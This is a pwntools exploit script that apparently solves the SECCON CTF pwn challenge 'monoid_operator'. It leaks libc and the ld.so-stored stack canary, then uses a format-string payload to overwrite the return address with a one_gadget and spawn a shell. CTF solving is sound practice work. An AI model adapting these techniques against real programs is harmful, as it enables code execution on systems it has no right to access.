#encoding: utf-8

from pwn import *

def add(op, num, content):
	r.sendlineafter('?\n', op)
	r.sendlineafter('?\n', str(num))
	r.sendlineafter('s.\n', content)

def quit(name, content):
	r.sendlineafter('?\n', 'q')
	r.sendafter('name?\n', name)
	#DEBUG()
	r.sendafter('back!\n', content)

def DEBUG():
	gdb.attach(r, 'fin\nn 17\n')

#r = process(['docker', 'run', '-i', '-v', os.getcwd() + ':' + os.getcwd(), '-w', os.getcwd(), 'monoid_operator', 'prog/monoid_operator'])
#r = process(['./ld-linux-x86-64.so', '--library-path',  './',  './monoid_operator'])
r = process(['env', 'LD_LIBRARY_PATH=%s' % os.getcwd(), './ld-linux-x86-64.so', './monoid_operator'])
#r = remote('monoidoperator.chal.seccon.jp', 27182)

add('+', 136, '1000000000000000000 '*136)
add('+', 136, '- '*2 + '0 '*134)
r.recvuntil('is ')
libc_base =  int(r.recvuntil('.')[:-1], 10)//2 - 0x1e4ca0
print "libc_base @ ", hex(libc_base)

one_gadget = [0x106ef8]
one_shot = libc_base + one_gadget[0]
ldso_gap = 0x1e7000 # ld.so 會存放 canary !!
cookie_offset = 0x55a8 # 用 18.04 跑 offset 0x55a8 , 用 19.04 跑 offset 0x5568 , 這點要特別注意 !!
canary_ptr = libc_base + ldso_gap + cookie_offset
print "canary_ptr @ ", hex(canary_ptr)
print "one_gadget @ ", hex(one_shot)

fmt  = '%7$1032c' # padding
fmt += '%8$c'+'%13$.7s'	  # canary
fmt += 'a'*8 # rbp
fmt += p64(one_shot)[:-2] # ra
fmt += '%8$c' * ((0x3ff-len(fmt))//4)

quit(p64(canary_ptr+1)[:-1], fmt)

r.interactive()